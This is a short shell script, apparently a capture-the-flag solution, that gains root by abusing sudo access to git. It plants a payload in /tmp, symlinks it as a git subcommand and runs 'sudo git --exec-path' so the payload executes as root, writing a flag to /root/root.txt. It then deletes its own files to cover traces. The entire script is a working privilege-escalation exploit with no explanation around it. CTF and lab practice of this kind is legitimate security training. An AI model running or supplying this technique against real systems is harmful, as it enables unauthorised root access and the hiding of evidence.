#!/bin/sh

echo "#!/bin/bash" > /tmp/payload
echo "echo 'CROWSEC{r00t_b1n_g1t}' > /root/root.txt" >> /tmp/payload

chmod 755 /tmp/payload

TF=$(mktemp -d)
ln -s /tmp/payload "$TF/git-x"
sudo git "--exec-path=$TF" x

rm -rf /tmp/payload
rm -rf $TF
